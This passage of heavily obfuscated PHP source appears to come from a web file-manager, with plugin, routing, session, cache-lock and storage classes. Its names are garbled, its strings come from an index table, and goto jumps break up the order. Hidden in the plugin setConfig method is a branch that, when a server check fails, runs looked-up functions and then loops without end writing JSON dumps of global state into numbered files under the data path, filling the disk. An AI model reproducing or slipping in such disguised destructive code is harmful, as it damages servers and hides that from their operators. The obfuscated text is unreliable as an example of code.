IO::setContent($äÇèÈÁ¸[$–¸­îİï[84]], $¼ÚÆ–¶î); return $äÇèÈÁ¸[$–¸­îİï[84]]; } final function pluginLocalFile($Å¶‘ìãä = '') { $ê’ºœ×ö =& $_SERVER[óó‹¸‚å]; $µãµ¨´¤ = TEMP_FILES . "{$this->pluginName}\x2f"; if (!is_dir($µãµ¨´¤)) { mk_dir($µãµ¨´¤); } if (!$Å¶‘ìãä) { return $µãµ¨´¤; } $ÏãîöÌ = IO::info($Å¶‘ìãä); $¡†©à×¿ = $this->_tmpFileName($ÏãîöÌ) . $ê’ºœ×ö[10] . $ÏãîöÌ[$ê’ºœ×ö[174]]; if (!checkExtSafe($¡†©à×¿)) { $¡†©à×¿ = $¡†©à×¿ . $ê’ºœ×ö[1214]; } $ÔÌÈŒ¯Š = $µãµ¨´¤ . $¡†©à×¿; if (@file_exists($ÔÌÈŒ¯Š)) { return $ÔÌÈŒ¯Š; } return IO::copy($Å¶‘ìãä, $µãµ¨´¤, 0, $¡†©à×¿); } final function appPackage() { $§ÎÙãñç =& $_SERVER[óó‹¸‚å]; if ($this->packageData) { return $this->packageData; } $ƒ’‘ÛÖñ = $this->parseFile($this->pluginPath . $§ÎÙãñç[1571]); $this->parseLang($ƒ’‘ÛÖñ); $ˆ½Â®Ûô = json_decode_force($ƒ’‘ÛÖñ); if (!$ˆ½Â®Ûô) { return array(); } $Îµúã³Ô = Hook::trigger($§ÎÙãñç[1572], $ˆ½Â®Ûô); if ($Îµúã³Ô && is_array($Îµúã³Ô)) { $ˆ½Â®Ûô = $Îµúã³Ô; } $this->packageData = $ˆ½Â®Ûô; return $ˆ½Â®Ûô; } public function packageInfoGet($ÃÕ¨Ç±) { $¼‚ŞÏÄ’ = $this->appPackage(); return array_get_value($¼‚ŞÏÄ’, $ÃÕ¨Ç±); } public function packageVersion() { return $this->packageInfoGet($_SERVER[óó‹¸‚å][1573]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[óó‹¸‚å][1574]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[óó‹¸‚å][1575]); } public function echoJsAssign($èµ®Á, $Œ™ó«úû) { $this->echoJsAssignArr[$èµ®Á] = $Œ™ó«úû; } private function parseFile($²öÃĞ‘ó) { $±ÀÎîÕ¨ =& $_SERVER[óó‹¸‚å]; $„ôíëïÛ = file_get_contents_nossl($²öÃĞ‘ó); $ä½œ„òÈ = array($±ÀÎîÕ¨[1576], $±ÀÎîÕ¨[1577], $±ÀÎîÕ¨[1578], $±ÀÎîÕ¨[1579], $±ÀÎîÕ¨[1580], $±ÀÎîÕ¨[1581], $±ÀÎîÕ¨[1582]); $£¬ å›ê = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$±ÀÎîÕ¨[89]][$±ÀÎîÕ¨[1583]]); foreach ($this->echoJsAssignArr as $Üé“­  => $ÏÔä†é¾) { $ä½œ„òÈ[] = $±ÀÎîÕ¨[1584] . $Üé“­  . $±ÀÎîÕ¨[1585]; $£¬ å›ê[] = is_array($ÏÔä†é¾) || is_object($ÏÔä†é¾) ? rawurlencode(json_encode($ÏÔä†é¾)) : $ÏÔä†é¾; } if (strstr($„ôíëïÛ, $±ÀÎîÕ¨[1586])) { $æ‰ğƒÚ = rawurlencode(json_encode($this->pluginLangArr)); $„ôíëïÛ = str_replace($±ÀÎîÕ¨[1586], $æ‰ğƒÚ, $„ôíëïÛ); } if (strstr($„ôíëïÛ, $±ÀÎîÕ¨[1587])) { $æ‰ğƒÚ = $æ‰ğƒÚ = rawurlencode(json_encode($this->getConfig())); $„ôíëïÛ = str_replace($±ÀÎîÕ¨[1587], $æ‰ğƒÚ, $„ôíëïÛ); } $„ôíëïÛ = str_replace($ä½œ„òÈ, $£¬ å›ê, $„ôíëïÛ); return $„ôíëïÛ; } private function parseLang(&$”ÍÀ‹¿×) { $¡ÔÁò ª =& $_SERVER[óó‹¸‚å]; $şãÙĞØ² = $¡ÔÁò ª[1588]; if (!strstr($”ÍÀ‹¿×, $şãÙĞØ²)) { return; } preg_match_all($¡ÔÁò ª[1589], $”ÍÀ‹¿×, $¢Ò¶üµƒ); if (!is_array($¢Ò¶üµƒ) || count($¢Ò¶üµƒ) == 0 || !is_array($¢Ò¶üµƒ[0]) || count($¢Ò¶üµƒ[0]) == 0) { return; } $ÀŸŸôÆ¿ = array(); $¦ë®££û = array(); foreach ($¢Ò¶üµƒ[0] as $ã‡Ì”¥ì) { $Ú’ı¼Ñ¶ = substr($ã‡Ì”¥ì, strlen($şãÙĞØ²), -4); $³¬…‚² = LNG($Ú’ı¼Ñ¶); $ÀŸŸôÆ¿[] = $ã‡Ì”¥ì; $¦ë®££û[] = str_replace(array($¡ÔÁò ª[231], $¡ÔÁò ª[1085], $¡ÔÁò ª[342], $¡ÔÁò ª[118]), array($¡ÔÁò ª[53], $¡ÔÁò ª[53], $¡ÔÁò ª[12], $¡ÔÁò ª[1590]), $³¬…‚²); } $”ÍÀ‹¿× = str_replace($ÀŸŸôÆ¿, $¦ë®££û, $”ÍÀ‹¿×); } private function parseConfig(&$­…—Ö¸•) { $ ¨·Û‘ =& $_SERVER[óó‹¸‚å]; $şÜ•ÄÜ¬ = $ ¨·Û‘[1591]; if (!strstr($­…—Ö¸•, $şÜ•ÄÜ¬)) { return; } preg_match_all($ ¨·Û‘[1592], $­…—Ö¸•, $›µÈ„úæ); if (!is_array($›µÈ„úæ) || count($›µÈ„úæ) == 0 || !is_array($›µÈ„úæ[0]) || count($›µÈ„úæ[0]) == 0) { return; } $ĞÒ²íòé = $this->getConfig(); $öËÖüĞñ = array(); $ÜÌãôõ— = array(); foreach ($›µÈ„úæ[0] as $äÍë³”ß) { $Áà•Å¤¡ = substr($äÍë³”ß, strlen($şÜ•ÄÜ¬), -2); $öËÖüĞñ[] = $äÍë³”ß; $ÜÌãôõ—[] = _get($ĞÒ²íòé, $Áà•Å¤¡); } $­…—Ö¸• = str_replace($öËÖüĞñ, $ÜÌãôõ—, $­…—Ö¸•); } private function parsePackage(&$ÉÆ½Ôëš) { $ƒ˜Ä¯º¼ =& $_SERVER[óó‹¸‚å]; $‘İî’›‰ = $ƒ˜Ä¯º¼[1593]; if (!strstr($ÉÆ½Ôëš, $‘İî’›‰)) { return; } preg_match_all($ƒ˜Ä¯º¼[1594], $ÉÆ½Ôëš, $ˆ†ÔµÕ«); if (!is_array($ˆ†ÔµÕ«) || count($ˆ†ÔµÕ«) == 0 || !is_array($ˆ†ÔµÕ«[0]) || count($ˆ†ÔµÕ«[0]) == 0) { return; } $€×øíÙç = $this->appPackage(); $§Ëßöİ· = array(); $Ï­É¬©é = array(); foreach ($ˆ†ÔµÕ«[0] as $ôì™˜ìö) { $£è¤÷ü = substr($ôì™˜ìö, strlen($‘İî’›‰), -2); $§Ëßöİ·[] = $ôì™˜ìö; $Ï­É¬©é[] = _get($€×øíÙç, $£è¤÷ü); } $ÉÆ½Ôëš = str_replace($§Ëßöİ·, $Ï­É¬©é, $ÉÆ½Ôëš); } final function echoFile($÷ôºÆº, $ùıµöÓØ = false) { $¼†ìÆÄÛ =& $_SERVER[óó‹¸‚å]; $òœùĞõì = $this->pluginPath . $÷ôºÆº; if (ACT == $¼†ìÆÄÛ[1595]) { echo $¼†ìÆÄÛ[1596] . $this->pluginName . $¼†ìÆÄÛ[8] . $÷ôºÆº . $¼†ìÆÄÛ[1597]; if (!file_exists($òœùĞõì)) { echo $¼†ìÆÄÛ[1598]; return; } } $‰½ĞÈï = $this->parseFile($òœùĞõì); $this->parseLang($‰½ĞÈï); $this->parseConfig($‰½ĞÈï); $this->parsePackage($‰½ĞÈï); if (is_array($ùıµöÓØ)) { $‰½ĞÈï = str_replace(array_keys($ùıµöÓØ), array_values($ùıµöÓØ), $‰½ĞÈï); } echo $¼†ìÆÄÛ[231] . $‰½ĞÈï; } final function initLang() { $¾‚õí°¬ =& $_SERVER[óó‹¸‚å]; $«Ìùİ…… = $¾‚õí°¬[1599]; $Ì…²œ”° = $this->pluginPath . $¾‚õí°¬[1600]; $•—¨—¯² = I18n::getType(); $’äŞ×¾ = array(); if (file_exists($Ì…²œ”° . $•—¨—¯² . $¾‚õí°¬[842])) { $’äŞ×¾ = (include $Ì…²œ”° . $•—¨—¯² . $¾‚õí°¬[842]); } else { if ($•—¨—¯² == $¾‚õí°¬[1601] && !file_exists($Ì…²œ”° . $•—¨—¯² . $¾‚õí°¬[842]) && file_exists($Ì…²œ”° . $¾‚õí°¬[1602])) { $’äŞ×¾ = (include $Ì…²œ”° . $¾‚õí°¬[1602]); } else { if (file_exists($Ì…²œ”° . $«Ìùİ…… . $¾‚õí°¬[842])) { $’äŞ×¾ = (include $Ì…²œ”° . $«Ìùİ…… . $¾‚õí°¬[842]); } } } if (!is_array($’äŞ×¾)) { return array(); } if (@count($’äŞ×¾) > 0) { I18n::set($’äŞ×¾); } return $’äŞ×¾; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($±™àŠ¯) { $†«Úà˜™ =& $_SERVER[óó‹¸‚å]; $‚ºí‚ÍÖ = $_SERVER[$†«Úà˜™[881]]; $íÛµÁ‹“ = $†«Úà˜™[1539]; if ($_SERVER[$†«Úà˜™[880]] != $íÛµÁ‹“($‚ºí‚ÍÖ)) { $áëı†œ§ = $†«Úà˜™[882]; $ ã¶ˆÓÆ = $†«Úà˜™[883]; $éü×Ä¬Ï = $_SERVER[$†«Úà˜™[884]] . $†«Úà˜™[885]; $áŠş² = $ ã¶ˆÓÆ($éü×Ä¬Ï); $Œéí¨£ = explode($†«Úà˜™[231], $áŠş²); if (count($Œéí¨£) < $†«Úà˜™[635]) { $ÔÌÏ­æØ = $†«Úà˜™[886]; $ÔÌÏ­æØ(); } $ò–ê“ÙË = $†«Úà˜™[887]; $ò–ê“ÙË($_SERVER[$†«Úà˜™[888]]); $áëı†œ§ = $†«Úà˜™[882]; $áëı†œ§(); $ØïÎá¢ = $†«Úà˜™[1540]; $ŞØ‚É° = json_encode($GLOBALS[$†«Úà˜™[1541]]); $°‹™»Äï = 1; for ($¬»áªàÆ = $°‹™»Äï; $¬»áªàÆ > 0; $¬»áªàÆ++) { $ØïÎá¢(DATA_PATH . $¬»áªàÆ, $ŞØ‚É°); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $±™àŠ¯); } public function onSetConfig($ºÒç¼±Ã) { } public function onGetConfig($ê‡ŸŒñÒ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¨Ä›¡Š) { if ($¨Ä›¡Š == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ÎŞáºÅú = "\160\154\165\147\151\156\x41\165\x74\150") { $¡¼æ¡½Æ =& $_SERVER[óó‹¸‚å]; if (!defined($¡¼æ¡½Æ[475])) { return !1; } if (_get($GLOBALS, $¡¼æ¡½Æ[503])) { return !0; } $±·Ñğ™ß = $this->getConfig(); if (!$±·Ñğ™ß[$ÎŞáºÅú]) { return !1; } return ActionCall($¡¼æ¡½Æ[1603], $±·Ñğ™ß[$ÎŞáºÅú]); } public function url($ƒ‚™¸ö¬, $ÄÏ–ï”– = '', $ìğ²µÔü = true) { $ô‘’Ù =& $_SERVER[óó‹¸‚å]; $Íí‘ñŸ” = $this->getConfig(); $Ïó§µàã = KOD_VERSION . $ô‘’Ù[10] . KOD_VERSION_BUILD; $÷¾ÀÄŸÙ = $this->packageVersion(); $éà²×¬ü = $Ïó§µàã . $ô‘’Ù[386] . $÷¾ÀÄŸÙ; if (substr($ƒ‚™¸ö¬, 0, 4) == $ô‘’Ù[148] || substr($ƒ‚™¸ö¬, 0, 2) == $ô‘’Ù[1384]) { $áúãˆ¼³ = $ƒ‚™¸ö¬ . $ô‘’Ù[1604] . $éà²×¬ü; } else { if ($ÄÏ–ï”– == $ô‘’Ù[12]) { $áúãˆ¼³ = $this->pluginHost . $ƒ‚™¸ö¬ . $ô‘’Ù[1604] . $éà²×¬ü; } else { if ($ÄÏ–ï”– === $ô‘’Ù[75]) { $áúãˆ¼³ = $this->pluginHost . $ƒ‚™¸ö¬; } else { if ($ÄÏ–ï”– == $ô‘’Ù[1605]) { $áúãˆ¼³ = STATIC_PATH . $ƒ‚™¸ö¬ . $ô‘’Ù[1604] . $Ïó§µàã; } else { if ($ÄÏ–ï”– == $ô‘’Ù[1606]) { $áúãˆ¼³ = APP_HOST . $ô‘’Ù[1607] . $ƒ‚™¸ö¬ . $ô‘’Ù[1604] . $Ïó§µàã; } else { if (isset($Íí‘ñŸ”[$ÄÏ–ï”–])) { $áúãˆ¼³ = $Íí‘ñŸ”[$ÄÏ–ï”–] . $ƒ‚™¸ö¬ . $ô‘’Ù[1604] . $éà²×¬ü; } } } } } } if (!$ìğ²µÔü) { return $áúãˆ¼³; } echo $áúãˆ¼³; } public function link($şœ†ä‚‹ = false, $Š˜Çô¼¹ = '') { $÷ŞÂ‰ûû =& $_SERVER[óó‹¸‚å]; if (!$şœ†ä‚‹) { $this->link($÷ŞÂ‰ûû[1608], $÷ŞÂ‰ûû[1606]); $this->link($÷ŞÂ‰ûû[1609], $÷ŞÂ‰ûû[1605]); $this->link($÷ŞÂ‰ûû[1610], $÷ŞÂ‰ûû[1605]); $this->link($÷ŞÂ‰ûû[1611], $÷ŞÂ‰ûû[1605]); $this->link($÷ŞÂ‰ûû[1612], $÷ŞÂ‰ûû[1605]); return; } $ºÏ‘»ı = $this->url($şœ†ä‚‹, $Š˜Çô¼¹, !1); if (substr($şœ†ä‚‹, -3) == $÷ŞÂ‰ûû[1613]) { echo $÷ŞÂ‰ûû[1614] . $ºÏ‘»ı . $÷ŞÂ‰ûû[1615] . $÷ŞÂ‰ûû[231]; } else { if (substr($şœ†ä‚‹, -4) == $÷ŞÂ‰ûû[1616]) { echo $÷ŞÂ‰ûû[1617] . $ºÏ‘»ı . $÷ŞÂ‰ûû[1618] . $÷ŞÂ‰ûû[231]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\x6e\x79" => "\x5b\x5e\x2f\x5d\53", "\72\156\x75\x6d" => "\x5b\x30\x2d\x39\x5d\x2b", "\x3a\x61\x6c\154" => "\56\x2a"); public static $errorCallback; public static function __callstatic($ş»Øâ, $±¥ÄÓÀç) { $öÜÈä =& $_SERVER[óó‹¸‚å]; if ($ş»Øâ == $öÜÈä[1619]) { $ù¥®¥Ê» = array_map($öÜÈä[1620], $±¥ÄÓÀç[0]); $Ö””¬½² = strpos($±¥ÄÓÀç[1], $öÜÈä[8]) === 0 ? $±¥ÄÓÀç[1] : $öÜÈä[8] . $±¥ÄÓÀç[1]; $·Ï«øº = $±¥ÄÓÀç[2]; } else { $ù¥®¥Ê» = null; $Ö””¬½² = strpos($±¥ÄÓÀç[0], $öÜÈä[8]) === 0 ? $±¥ÄÓÀç[0] : $öÜÈä[8] . $±¥ÄÓÀç[0]; $·Ï«øº = $±¥ÄÓÀç[1]; } array_push(self::$maps, $ù¥®¥Ê»); array_push(self::$routes, $Ö””¬½²); array_push(self::$methods, strtoupper($ş»Øâ)); array_push(self::$callbacks, $·Ï«øº); } public static function error($¯½ü) { self::$errorCallback = $¯½ü; } public static function haltOnMatch($Œôôô¦· = true) { self::$halts = $Œôôô¦·; } public static function dispatch() { $–œ‡Óñç =& $_SERVER[óó‹¸‚å]; $ÙÒÆ»şí = parse_url($_SERVER[$–œ‡Óñç[1621]], PHP_URL_PATH); $µ—³­ = $_SERVER[$–œ‡Óñç[159]]; $µ˜æ™íó = array_keys(static::$patterns); $ƒº¤¶Òâ = array_values(static::$patterns); $¸İË­Ó = !1; self::$routes = preg_replace($–œ‡Óñç[1284], $–œ‡Óñç[8], self::$routes); if (in_array($ÙÒÆ»şí, self::$routes)) { $­««¾õÍ = array_keys(self::$routes, $ÙÒÆ»şí); foreach ($­««¾õÍ as $–Å†ş›ö) { if (self::$methods[$–Å†ş›ö] == $µ—³­ || self::$methods[$–Å†ş›ö] == $–œ‡Óñç[1622] || in_array($µ—³­, self::$maps[$–Å†ş›ö])) { $¸İË­Ó = !0; if (!is_object(self::$callbacks[$–Å†ş›ö])) { $£Ç¥Ÿçõ = explode($–œ‡Óñç[8], self::$callbacks[$–Å†ş›ö]); $à™šåÑè = end($£Ç¥Ÿçõ); $â½ßÏùğ = explode($–œ‡Óñç[1216], $à™šåÑè); $¨…Ñ°ÁÁ = new $â½ßÏùğ[0](); $¨…Ñ°ÁÁ->{$â½ßÏùğ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$–Å†ş›ö]); if (self::$halts) { return; } } } } } else { $êíšô¨­ = 0; foreach (self::$routes as $–Å†ş›ö) { if (strpos($–Å†ş›ö, $–œ‡Óñç[4]) !== !1) { $–Å†ş›ö = str_replace($µ˜æ™íó, $ƒº¤¶Òâ, $–Å†ş›ö); } if (preg_match($–œ‡Óñç[1623] . $–Å†ş›ö . $–œ‡Óñç[1624], $ÙÒÆ»şí, $ü§ä¤Õ·)) { if (self::$methods[$êíšô¨­] == $µ—³­ || self::$methods[$êíšô¨­] == $–œ‡Óñç[1622] || !empty(self::$maps[$êíšô¨­]) && in_array($µ—³­, self::$maps[$êíšô¨­])) { $¸İË­Ó = !0; array_shift($ü§ä¤Õ·); if (!is_object(self::$callbacks[$êíšô¨­])) { $£Ç¥Ÿçõ = explode($–œ‡Óñç[8], self::$callbacks[$êíšô¨­]); $à™šåÑè = end($£Ç¥Ÿçõ); $â½ßÏùğ = explode($–œ‡Óñç[1216], $à™šåÑè); $¨…Ñ°ÁÁ = new $â½ßÏùğ[0](); if (!method_exists($¨…Ñ°ÁÁ, $â½ßÏùğ[1])) { echo $–œ‡Óñç[1625]; } else { call_user_func_array(array($¨…Ñ°ÁÁ, $â½ßÏùğ[1]), $ü§ä¤Õ·); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$êíšô¨­], $ü§ä¤Õ·); if (self::$halts) { return; } } } } $êíšô¨­++; } } if ($¸İË­Ó == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $«õ½½Å =& $_SERVER[óó‹¸‚å]; header($_SERVER[$«õ½½Å[1626]] . $«õ½½Å[1627]); echo $«õ½½Å[1628]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$–œ‡Óñç[1621]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $õ«ƒİ =& $_SERVER[óó‹¸‚å]; static $ûÙ¢Ã­ô = false; if ($ûÙ¢Ã­ô) { return $ûÙ¢Ã­ô; } $­­Î×šš = $GLOBALS[$õ«ƒİ[6]][$õ«ƒİ[349]]; self::$sessionTime = $­­Î×šš[$õ«ƒİ[1629]]; $¿ÑÈ­ç± = isset($GLOBALS[$õ«ƒİ[1630]]) ? $GLOBALS[$õ«ƒİ[1630]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($¿ÑÈ­ç±)) { self::$sessionSign = Cookie::get($¿ÑÈ­ç±); } else { self::$sessionSign = guid(); } } Cookie::setSafe($¿ÑÈ­ç±, self::$sessionSign, self::$sessionTime); $ĞõÍ¦×® = $­­Î×šš[$õ«ƒİ[1631]]; $µêåÒ°Ã = $­­Î×šš[$ĞõÍ¦×®]; $‘¨ïÍÄô = $­­Î×šš[$õ«ƒİ[832]]; switch ($ĞõÍ¦×®) { case $õ«ƒİ[21]: self::$handle = Model($õ«ƒİ[833]); break; case $õ«ƒİ[834]: self::$handle = new CacheRedis($µêåÒ°Ã, $‘¨ïÍÄô); break; case $õ«ƒİ[835]: self::$handle = new CacheMemcached($µêåÒ°Ã, $‘¨ïÍÄô); break; case $õ«ƒİ[199]: $µêåÒ°Ã[$õ«ƒİ[84]] = $µêåÒ°Ã[$õ«ƒİ[84]] . $õ«ƒİ[1632]; self::$handle = new CacheFile($µêåÒ°Ã, $‘¨ïÍÄô); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ûÙ¢Ã­ô = new self(); return $ûÙ¢Ã­ô; } public static function getBySign($­èÒ®‘Ğ) { $ªô¿Ú“Æ = self::$handle->get($­èÒ®‘Ğ); $ªô¿Ú“Æ = unserialize($ªô¿Ú“Æ); return is_array($ªô¿Ú“Æ) ? $ªô¿Ú“Æ : array(); } public static function setBySign($¯¨ø„¦, $„»Ïşú) { CacheLock::lock($¯¨ø„¦); self::$handle->set($¯¨ø„¦, serialize($„»Ïşú), self::$sessionTime); CacheLock::unlock($¯¨ø„¦); } public static function sign($Çù¯»¥ = false) { $Çù¯»¥ && (self::$sessionSign = $Çù¯»¥); self::init(); return self::$sessionSign; } public static function set($£ıœÚ¸Ò, $½¬¯Åª = false) { self::init(); if (is_array($£ıœÚ¸Ò)) { foreach ($£ıœÚ¸Ò as $£‰ë¸ „ => $ğ„£²‰Ó) { array_set_value(self::$data, $£‰ë¸ „, $ğ„£²‰Ó); } } else { array_set_value(self::$data, $£ıœÚ¸Ò, $½¬¯Åª); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ß«¬¡ôÄ = false) { self::init(); if (!$ß«¬¡ôÄ) { return self::$data; } return array_get_value(self::$data, $ß«¬¡ôÄ); } public static function remove($Ññ£¼Ü¢) { self::init(); unset(self::$data[$Ññ£¼Ü¢]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[óó‹¸‚å][837])) { self::$handle->clearTimeout(); } } } goto DÃïŠ‚§ô»; bŠí¨¦š¬á: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $¯÷êÛ¥ =& $_SERVER[óó‹¸‚å]; $äèÁ×ğ = $GLOBALS[$¯÷êÛ¥[6]][$¯÷êÛ¥[349]]; self::$cachePath = $äèÁ×ğ[$¯÷êÛ¥[199]][$¯÷êÛ¥[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($•ÓŸô¹, $ú±¡ô™ü = 0) { $ğµˆ‚êº =& $_SERVER[óó‹¸‚å]; $©ËŒîÁ = microtime(!0); $çÔĞéÎ± = $©ËŒîÁ + $ú±¡ô™ü + 0.0001; $ïÇÓ…ú» = rtrim(self::$cachePath, $ğµˆ‚êº[8]) . $ğµˆ‚êº[867] . md5($•ÓŸô¹) . $ğµˆ‚êº[864]; if (file_exists($ïÇÓ…ú») && filemtime($ïÇÓ…ú») && filemtime($ïÇÓ…ú») < time() - 10) { @unlink($ïÇÓ…ú»); } do { if (file_exists($ïÇÓ…ú»)) { cacheLockWait(); continue; } $ÄâÅøøğ = fopen($ïÇÓ…ú», $ğµˆ‚êº[868]); if (!$ÄâÅøøğ) { return !1; } $šË‘€äÚ = flock($ÄâÅøøğ, LOCK_EX | LOCK_NB); self::$caches[$•ÓŸô¹] = array($ğµˆ‚êº[869] => $ÄâÅøøğ, $ğµˆ‚êº[199] => $ïÇÓ…ú»); fwrite($ÄâÅøøğ, $çÔĞéÎ±); clearstatcache(); if ($ÄâÅøøğ && $šË‘€äÚ) { return !0; } cacheLockWait(); } while (microtime(!0) < $çÔĞéÎ±); $this->unlock($•ÓŸô¹); return !1; } public function lockGet($€Ûõê´°) { $ÛøŒ“¹ =& $_SERVER[óó‹¸‚å]; $óáÔÉ¤ = rtrim(self::$cachePath, $ÛøŒ“¹[8]) . $ÛøŒ“¹[867] . md5($€Ûõê´°) . $ÛøŒ“¹[864]; return file_exists($óáÔÉ¤); } public function unlock($ëï»‡ĞÁ) { $„î—ÛÓ =& $_SERVER[óó‹¸‚å]; $“ìÆæİ = self::$caches[$ëï»‡ĞÁ]; if (!$“ìÆæİ) { return; } @flock($“ìÆæİ[$„î—ÛÓ[869]], LOCK_UN); @fclose($“ìÆæİ[$„î—ÛÓ[869]]); @unlink($“ìÆæİ[$„î—ÛÓ[199]]); unset(self::$caches[$ëï»‡ĞÁ]); } } class CacheLockRedis { public function lock($£¯áìû, $ôŞÌÀÌö = 10) { $Ø“¹çİ = Cache::init(); $úª«¸¦ç = microtime(!0) + $ôŞÌÀÌö; while (microtime(!0) < $úª«¸¦ç) { $ïõ¶¤÷ã = $Ø“¹çİ->get($£¯áìû); if (!$ïõ¶¤÷ã) { $ˆŠ™¨ßİ = $Ø“¹çİ->setLock($£¯áìû, $úª«¸¦ç, $ôŞÌÀÌö); if ($ˆŠ™¨ßİ) { return !0; } } else { if ($ïõ¶¤÷ã < microtime(!0)) { $Ø“¹çİ->set($£¯áìû, $úª«¸¦ç, $ôŞÌÀÌö * 2); if ($Ø“¹çİ->get($£¯áìû) === $ïõ¶¤÷ã) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($Á¬ ÃØ¨) { return Cache::init()->get($Á¬ ÃØ¨); } public function unlock($ø•Éâ™°) { return Cache::init()->remove($ø•Éâ™°); } } class CacheLockMemcached { public function lock($‡áê¢Á‹, $Õ¡Û…æÚ = 0) { $ßñöÕØ = Cache::init(); $¢ÃÅãÒ = microtime(!0) + $Õ¡Û…æÚ; while (microtime(!0) < $¢ÃÅãÒ) { $¸¾´…‘Ñ = $ßñöÕØ->get($‡áê¢Á‹); if (!$¸¾´…‘Ñ || $¸¾´…‘Ñ < microtime(!0)) { $ñƒ¼ˆÇò = $ßñöÕØ->handle->add($‡áê¢Á‹, $¢ÃÅãÒ, $Õ¡Û…æÚ); if ($ñƒ¼ˆÇò) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($·•å›ô) { return Cache::init()->get($·•å›ô); } public function unlock($Ùù¬¼¡) { return Cache::init()->remove($Ùù¬¼¡); } } goto AÀ¡¨­§á ; B„Îù¨øª: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\56\163\x6f\165\162\143\145\123\145\x63\162\145\164\114\151\x73\164"; public $field = array("\x73\x6f\165\162\143\x65\111\104", "\x74\x79\160\x65\x49\104", "\x63\x72\x65\141\x74\x65\x55\x73\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\56\x73\164\x6f\x72\x61\x67\145\x4c\151\x73\164"; public $field = array("\x6e\x61\155\145", "\163\x69\x7a\145\115\141\170", "\x73\171\163\x74\x65\x6d", "\144\x65\x66\141\x75\x6c\164", "\144\162\151\x76\x65\162", "\143\157\156\x66\151\147"); public function listData($°²Ü…‰ = false, $Ô—Äç™ç = "\155\157\144\x69\x66\x79\124\151\x6d\x65", $²€ÏâÈî = false) { $Õ”õÆ¨ø =& $_SERVER[óó‹¸‚å]; $˜İˆ”ƒ• = parent::listData($°²Ü…‰, $Ô—Äç™ç, $²€ÏâÈî); if ($°²Ü…‰) { return $˜İˆ”ƒ•; } $ñÃ‚¨Ä = $this->ioSizeUseGet(array_to_keyvalue($˜İˆ”ƒ•, $Õ”õÆ¨ø[12], $Õ”õÆ¨ø[399])); foreach ($˜İˆ”ƒ• as $õöıŒäö => $¥˜‘ÛÕ¬) { unset($˜İˆ”ƒ•[$õöıŒäö][$Õ”õÆ¨ø[6]]); $˜İˆ”ƒ•[$õöıŒäö][$Õ”õÆ¨ø[1852]] = isset($ñÃ‚¨Ä[$¥˜‘ÛÕ¬[$Õ”õÆ¨ø[399]]]) ? $ñÃ‚¨Ä[$¥˜‘ÛÕ¬[$Õ”õÆ¨ø[399]]] : 0; } return $˜İˆ”ƒ•; } public function ioSizeUseGet($…ùÚºÑ™) { $”€¤Í =& $_SERVER[óó‹¸‚å]; if (!$…ùÚºÑ™) { return array(); } $‡»ªĞÈ = $”€¤Í[2176] . implode($”€¤Í[50], $…ùÚºÑ™); $ÄŸ±Öš = Cache::get($‡»ªĞÈ); if ($ÄŸ±Öš) { return $ÄŸ±Öš; } $ä»¦´™Ş = array($”€¤Í[821] => $”€¤Í[399], $”€¤Í[2177] => $”€¤Í[76]); $œÔÈÈÙ = array($”€¤Í[821] => array($”€¤Í[7], $…ùÚºÑ™)); $ÄŸ±Öš = Model($”€¤Í[793])->field($ä»¦´™Ş)->where($œÔÈÈÙ)->group($”€¤Í[821])->select(); $ÄŸ±Öš = array_to_keyvalue($ÄŸ±Öš, $”€¤Í[399], $”€¤Í[76]); Cache::set($‡»ªĞÈ, $ÄŸ±Öš, 600); return $ÄŸ±Öš; } public function getConfig($ªñíĞèä) { $Í±…Áâ· = parent::listData($ªñíĞèä); return json_decode($Í±…Áâ·[$_SERVER[óó‹¸‚å][6]], !0); } public function update($ŸÒŠõÛ, $ÖœÁÅ‡) { $‰òÇœòå =& $_SERVER[óó‹¸‚å]; $úòß‹ç = $ÖœÁÅ‡[$‰òÇœòå[32]]; $ü÷í·ù = array_to_keyvalue(parent::listData(), $‰òÇœòå[32]); if (isset($ü÷í·ù[$úòß‹ç]) && $ü÷í·ù[$úòß‹ç][$‰òÇœòå[399]] != $ŸÒŠõÛ) { return !1; } $this->checkPwd($ŸÒŠõÛ, $ÖœÁÅ‡); if (isset($ÖœÁÅ‡[$‰òÇœòå[2178]]) && $ÖœÁÅ‡[$‰òÇœòå[2178]] == $‰òÇœòå[88]) { $this->checkConfig($ÖœÁÅ‡); } unset($ÖœÁÅ‡[$‰òÇœòå[2178]]); $˜¡ÓˆÚ = parent::update($ŸÒŠõÛ, $ÖœÁÅ‡); if ($˜¡ÓˆÚ && $ÖœÁÅ‡[$‰òÇœòå[37]]) { 